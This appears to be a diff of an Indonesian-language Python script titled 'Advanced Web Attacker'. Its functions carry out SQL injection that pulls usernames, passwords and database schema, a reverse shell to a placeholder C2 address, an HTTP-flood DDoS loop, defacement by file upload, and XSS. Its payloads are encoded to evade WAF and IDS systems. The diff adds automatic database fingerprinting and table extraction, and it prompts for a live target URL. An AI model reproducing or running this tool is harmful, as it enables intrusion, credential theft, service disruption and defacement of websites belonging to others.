@@ -67,30 +67,18 @@ def create_session():
     return session
 
 def encode_payload(payload):
-    """
-    Encode payload dengan metode base64 atau hex untuk menyamarkan payload.
-    """
     base64_encoded = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
     hex_encoded = payload.encode('utf-8').hex()
     return base64_encoded, hex_encoded
 
 def url_encode_payload(payload):
-    """
-    URL encode payload untuk bypass WAF yang berbasis analisis pola.
-    """
     return urllib.parse.quote(payload)
 
 def load_ml_model():
-    """
-    Load and return the pre-trained machine learning model for payload detection.
-    """
     model = load_model('ml_model.h5')
     return model
 
 def predict_payload(model, payload):
-    """
-    Predict if a payload is SQLi or XSS using the pre-trained model.
-    """
     vectorizer = CountVectorizer()
     payload_vector = vectorizer.transform([payload])
     prediction = model.predict(payload_vector)
@@ -125,9 +113,6 @@ def fuzz_target(url):
             print(f"{R}Gagal fuzzing pada: {fuzzed_url_base64}, status code: {response_base64.status_code}{N}")
 
 def advanced_sql_injection(url, session):
-    """
-    Payload advanced SQL injection (mimicking zero-day payloads).
-    """
     payload = "' UNION SELECT null, username, password FROM users --"
     encoded_payload = url_encode_payload(payload)
     fuzzed_url = f"{url}?id={encoded_payload}"
@@ -139,9 +124,6 @@ def advanced_sql_injection(url, session):
         print(f"{R}Gagal SQL Injection pada: {url}, status code: {response.status_code}{N}")
 
 def reverse_shell():
-    """
-    Reverse shell example connecting to a C2 server (be cautious in use).
-    """
     server_ip = 'YOUR_C2_SERVER_IP'
     server_port = 4444
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -155,18 +137,11 @@ def reverse_shell():
         sock.send(output.stdout + output.stderr)
 
 def multi_vector_attack(url, session):
-    """
-    Trigger multiple attack vectors in parallel.
-    """
     threading.Thread(target=advanced_sql_injection, args=(url, session)).start()
     threading.Thread(target=fuzz_target, args=(url,)).start()
     threading.Thread(target=reverse_shell).start()
 
 def deface_website(url, session):
-    """
-    Perform a website defacement attack by uploading a defacement payload.
-    Replace 'payload_file.html' with actual HTML content you want to use for defacing.
-    """
     payload = """
     <html>
     <head><title>Hacked</title></head>
@@ -181,9 +156,6 @@ def deface_website(url, session):
         print(f"{R}Gagal deface pada: {url}, status code: {response.status_code}{N}")
 
 def xss_attack(url):
-    """
-    Perform a simple XSS attack by injecting a script into the URL.
-    """
     payload = "<script>alert('XSS Attack!')</script>"
     xss_url = f"{url}?search={payload}"
     response = requests.get(xss_url)
@@ -193,30 +165,20 @@ def xss_attack(url):
         print(f"{R}Gagal XSS pada: {xss_url}{N}")
 
 def ddos_attack(url):
-    """
-    Perform a DDoS Layer 7 (HTTP Flood) attack by sending multiple HTTP requests with adaptive timing.
-    This method mimics real-world attack patterns, adjusting the rate based on server responses.
-    """
     while True:
         try:
-            # Dynamically adjust the request interval based on the server's response time.
             response = requests.get(url, headers={'User-Agent': get_random_user_agent()})
-            delay = max(0.1, response.elapsed.total_seconds())  # Delay based on response time
+            delay = max(0.1, response.elapsed.total_seconds())  
             print(f"{M}DDoS Attack on: {url}, Status Code: {response.status_code}, Delay: {delay}s{N}")
-            time.sleep(delay)  # Simulate adaptive attack rate
+            time.sleep(delay)  
         except requests.exceptions.RequestException as e:
             print(f"{R}Error during DDoS attack: {e}{N}")
             break
 
 def exfiltrate_data(url, session):
-    """
-    Exfiltrate data from the target server. This method simulates a data leak by sending sensitive information
-    (e.g., user credentials) to an external server under attacker's control.
-    """
     payload = "' OR 1=1 --"
     encoded_payload = url_encode_payload(payload)
     exfiltrate_url = f"{url}?input={encoded_payload}"
-    
     try:
         response = session.get(exfiltrate_url)
         if response.status_code == 200:
@@ -227,10 +189,6 @@ def exfiltrate_data(url, session):
         print(f"{R}Error during exfiltration: {e}{N}")
 
 def adaptive_payload(url, model):
-    """
-    Generate an adaptive payload using machine learning for evading WAF or IDS systems.
-    This method adjusts the payload based on feedback from the server.
-    """
     payloads = [
         "' OR '1'='1';", 
         "<img src='x' onerror='alert(1)' />", 
@@ -248,10 +206,6 @@ def adaptive_payload(url, model):
                 print(f"{R}Gagal dengan payload {payload}, status code: {response.status_code}{N}")
 
 def reconnaissance(target_url):
-    """
-    Perform automatic reconnaissance on the target website to gather information about the web server, 
-    technologies used, and possible vulnerabilities.
-    """
     session = create_session()
     try:
         response = session.get(target_url)
@@ -259,68 +213,87 @@ def reconnaissance(target_url):
             print(f"{G}Berhasil melakukan reconnaissance pada: {target_url}{N}")
             print(f"{C}Response Headers: {response.headers}{N}")
             print(f"{C}Cookies: {response.cookies}{N}")
+            
+            detect_database(target_url, session)
+            
+            extract_database_structure(target_url, session)
+            
             if 'X-Powered-By' in response.headers:
                 print(f"{Y}X-Powered-By: {response.headers['X-Powered-By']}{N}")
             if 'Server' in response.headers:
                 print(f"{Y}Server: {response.headers['Server']}{N}")
+            
+            # Check for possible SQL injection points
+            check_sql_injection(target_url, session)
         else:
             print(f"{R}Reconnaissance gagal pada: {target_url}, status code: {response.status_code}{N}")
     except requests.exceptions.RequestException as e:
         print(f"{R}Error during reconnaissance: {e}{N}")
 
-def banner_grabbing(target_ip):
-    """
-    Perform banner grabbing to gather information about the target's services.
-    """
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(5)
-        sock.connect((target_ip, 80))
-        sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
-        banner = sock.recv(1024)
-        print(f"{G}Banner Grabbing Success: {banner.decode('utf-8', errors='ignore')}{N}")
-    except socket.error as e:
-        print(f"{R}Error during banner grabbing: {e}{N}")
+def detect_database(target_url, session):
+    payloads = [
+        "' OR 1=1 --",  
+        "' AND 1=1 --",
+        "' UNION SELECT null, version() --",  # To get database version
+        "' UNION SELECT null, database() --"  # To get database name
+    ]
+    for payload in payloads:
+        encoded_payload = url_encode_payload(payload)
+        fuzzed_url = f"{target_url}?input={encoded_payload}"
+        response = session.get(fuzzed_url)
+        
+        if 'mysql' in response.text.lower():
+            print(f"{Y}Target appears to be running MySQL database.{N}")
+            break
+        elif 'PostgreSQL' in response.text:
+            print(f"{Y}Target appears to be running PostgreSQL database.{N}")
+            break
+        elif 'SQLite' in response.text:
+            print(f"{Y}Target appears to be running SQLite database.{N}")
+            break
 
-def ddos_distributed(url, num_threads=10):
+def extract_database_structure(target_url, session):
     """
-    Perform a distributed denial of service (DDoS) using multiple threads.
+    Try to extract the database structure such as tables and columns.
     """
-    with ThreadPoolExecutor(max_workers=num_threads) as executor:
-        for _ in range(num_threads):
-            executor.submit(ddos_attack, url)
-
-def deface_target(url, session):
-    """
-    Simulate a deface attack where malicious HTML is uploaded to overwrite the target's web page.
-    """
-    deface_payload = "<html><head><title>Hacked</title></head><body><h1>This website has been hacked!</h1></body></html>"
-    deface_url = f"{url}/upload"
-    files = {'file': ('deface.html', deface_payload, 'text/html')}
+    tables_payload = "' UNION SELECT null, table_name FROM information_schema.tables --"
+    columns_payload = "' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name = 'users' --"
     
-    try:
-        response = session.post(deface_url, files=files)
-        if response.status_code == 200:
-            print(f"{G}Website successfully defaced at: {url}{N}")
+    print(f"{B}Extracting tables...{N}")
+    encoded_tables_payload = url_encode_payload(tables_payload)
+    fuzzed_url = f"{target_url}?input={encoded_tables_payload}"
+    response = session.get(fuzzed_url)
+    
+    if response.status_code == 200 and "table_name" in response.text:
+        print(f"{G}Tables found: {response.text}{N}")
+        
+        print(f"{B}Extracting columns from 'users' table...{N}")
+        encoded_columns_payload = url_encode_payload(columns_payload)
+        fuzzed_url = f"{target_url}?input={encoded_columns_payload}"
+        response = session.get(fuzzed_url)
+        
+        if response.status_code == 200 and "column_name" in response.text:
+            print(f"{G}Columns found in 'users' table: {response.text}{N}")
         else:
-            print(f"{R}Failed to deface website at: {url}, status code: {response.status_code}{N}")
-    except requests.exceptions.RequestException as e:
-        print(f"{R}Error during defacement: {e}{N}")
+            print(f"{R}Failed to extract columns or no 'users' table found.{N}")
+    else:
+        print(f"{R}Failed to extract tables from the database.{N}")
 
-def encrypt_payload(payload):
-    """
-    Encrypt a payload using AES or another encryption technique.
-    """
-    from Crypto.Cipher import AES
-    from Crypto.Util.Padding import pad
-    from Crypto.Random import get_random_bytes
-    
-    key = get_random_bytes(16)
-    cipher = AES.new(key, AES.MODE_CBC)
-    ct_bytes = cipher.encrypt(pad(payload.encode(), AES.block_size))
-    iv = cipher.iv
-    encrypted_payload = base64.b64encode(iv + ct_bytes).decode('utf-8')
-    return encrypted_payload
+def check_sql_injection(target_url, session):
+    payloads = [
+        "' OR 1=1 --", 
+        "' AND 1=1 --", 
+        "' UNION SELECT null, username, password FROM users --"
+    ]
+    for payload in payloads:
+        encoded_payload = url_encode_payload(payload)
+        fuzzed_url = f"{target_url}?input={encoded_payload}"
+        response = session.get(fuzzed_url)
+        
+        if response.status_code == 200:
+            print(f"{G}Possible SQL Injection detected at: {fuzzed_url}{N}")
+        else:
+            print(f"{R}No SQL Injection detected at: {fuzzed_url}{N}")
 
 if __name__ == "__main__":
     print(pyfiglet.figlet_format("Advanced Web Attacker"))
@@ -328,7 +301,9 @@ if __name__ == "__main__":
     
     ml_model = load_ml_model()
 
-    target_url = "{ini menjadi url}"
+    target_url = input(f"{Y}Masukkan URL target yang ingin diuji: {N}")
+    
+    print(f"{M}Starting reconnaissance and attack tests on {target_url}{N}")
     
     reconnaissance(target_url)
 
